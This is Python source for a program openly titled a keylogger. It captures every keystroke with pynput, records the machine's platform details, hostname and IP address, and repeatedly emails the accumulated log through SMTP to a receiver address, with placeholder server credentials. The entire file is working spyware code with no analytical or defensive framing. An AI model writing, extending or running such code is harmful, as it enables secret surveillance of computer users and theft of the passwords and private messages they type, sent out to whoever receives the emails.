### KEYLOGGER version 0.1

### IMPORT SMTP E-MAIL SENDER AND INPUT LISTENER
import pynput
import smtplib, datetime, socket
from pynput.keyboard import Key,Listener

class emailer:
    def __init__(self, server_address, server_port, sender_user, sender_pass, receiver_address, log_file_path, cron_time):
        self.server_adress = server_address
        self.server_port = server_port
        self.sender_user = sender_user
        self.sender_pass = sender_pass
        self.receiver_address = receiver_address
        self.log_file_path = log_file_path
        self.cron_time = cron_time
        self.cron_log_file_path = "cron_log.txt"

    def scheduler(self):
        with open(self.cron_log_file_path, "r", encoding="utf-8") as file:
            for last_line in file:
                last_sent_date_raw = last_line

        last_sent_date = last_sent_date_raw.split(".")
        last_sent_date = list(map(int, last_sent_date))
        last_date = datetime.datetime(last_sent_date[0], last_sent_date[1], last_sent_date[2], last_sent_date[3], last_sent_date[4])
        difference = datetime.datetime.now() - last_date
        if((difference.seconds/60)>self.cron_time):
            return True
        else:
            return False

    def send(self):
        if(self.scheduler()):
            server = smtplib.SMTP(self.server_adress, self.server_port)
            server.login(self.sender_user, self.sender_pass)
            f = open(self.log_file_path, "r", encoding="utf-8")
            message = f.read()
            try:
                server.sendmail(self.sender_user, self.receiver_address, message.encode(encoding="utf-8"))
                print ("Successfully SENT")
                self.update_cron_log()
            except:
                print ("E-Mail Sender Error")
            f.close()

    def update_cron_log(self):
        file = open(self.cron_log_file_path, "a", encoding="utf-8")
        now = datetime.datetime.now()
        dt_string = now.strftime("%Y.%m.%d.%H.%M")
        file.write("\n"+dt_string)

class keylistener:
    def __init__(self, cron_time=1440):
        self.cron_time = cron_time
        self.count = 0
        self.keys = []
        self.log_file_path = "log.txt"
        self.emailer = emailer("mail.server.com", 587, "sender@server.com", "password", "receiver@server.com", self.log_file_path, cron_time)
        self.cron_time = cron_time
        self.platform_initial_logging()
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def on_press(self,key):
        self.count += 1
        print("{0} pressed".format(key))
        self.keys.append(key)
        if self.count >= 100:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []
            self.emailer.send()

    def platform_initial_logging(self):
        import platform
        file = open("log.txt", "a", encoding="utf-8")
        for i in platform.uname():
            file.write(str(i)+"\n")
        try:
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            file.write(hostname)
            file.write(ip_address)
        except:
            pass

        file.close()

    def write_file(self, keys):
        file = open(self.log_file_path, "a", encoding="utf-8")
        for key in self.keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)
        file.close()


    def on_release(self, key):
        if key == Key.esc:
            print("exit")
            return False
    #p1 = Person("John", 36)
    #p1.myfunc()


mykeylogger = keylistener(10)